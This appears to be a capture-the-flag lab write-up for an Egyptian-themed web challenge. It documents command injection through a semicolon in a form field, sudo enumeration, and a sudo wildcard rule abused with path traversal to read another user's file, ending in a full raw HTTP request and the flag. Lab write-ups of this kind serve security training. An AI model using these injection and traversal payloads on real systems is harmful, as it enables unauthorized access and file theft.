
You stand before the ancient device, a portal to the Egyptian underworld. This sacred technology, powered by the wisdom of Thoth, allows communication with the realm of the dead. For thousands of years, high priests used this oracle to unveil the fate of departed souls as they journeyed through Duat.

Note 1: This lab session is limited to 60 minutes. Once the session expires, a new instance will be provided. The lab environment will remain the same, but you may need to repeat certain steps.

Note 2: Your browser may display a security warning due to the lab's SSL certificate. This is expected and does not indicate any real security risk.

Tools needed: Burp Suite or equivalent

The response when special characters is url encoded.


when entering a first ; and a command the result of the commmand is printed as a comment down i the HTML.


```
ritual_1.log
<!-- System Log: Ritual 1 performed at 2025-04-22 08:15:23
Offering: wheat
Presiding Priest: Amenhotep
Note: High Priest keeps sacred_scroll.txt in their home directory. -->
```

```
ritual_2.log
<!-- System Log: Ritual 2 performed at 2025-04-22 10:30:45
Offering: bread
Presiding Priest: Ramose
Warning: Remember that the power of sudo must be wielded with precision. Always specify the full path to commands. -->
```

```
ritual_3.log
<!-- System Log: Ritual 3 performed at 2025-04-22 14:22:10
Offering: gold
Presiding Priest: Ptahmose
Note: Guard the sacred /path/, for each /traversal/ may awaken curses best left untouched. -->
```


```
sudo -l
<!-- System Log: User www-data may run the following commands on oracle-server:
    (high_priest) NOPASSWD: /usr/bin/cat /var/log/ritual/*
 -->
```

```
pwd
<!-- System Log: /var/www/html -->
```

```
whoami
<!-- System Log: www-data -->
```

```
sudo+-u+high_priest
<!-- System Log: sudo: sorry, you may only run /usr/bin/cat /var/log/ritual/* as high_priest on oracle-server -->
```


```

POST / HTTP/1.1
Host: 64.225.103.251:5006
Cookie: session=eyJpbnN0YW5jZV9pZCI6ImM2YjBiODUyLWVjOWEtNDhiOC04YjI4LWViNTc2ZjQ0NzA0MiJ9.aBMi8w.be-udodyFJl9f70rz9d6hbtzeww
Content-Length: 100
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB,en;q=0.9
Origin: https://64.225.103.251:5006
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://64.225.103.251:5006/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

name=%3Bsudo+-u+high_priest+/usr/bin/cat+/var/log/ritual/../../../home/high_priest/sacred_scroll.txt


------
<!-- System Log: O24{th3_scr1b3_r3v34ls_h1dd3n_tr34sur3s} -->
```
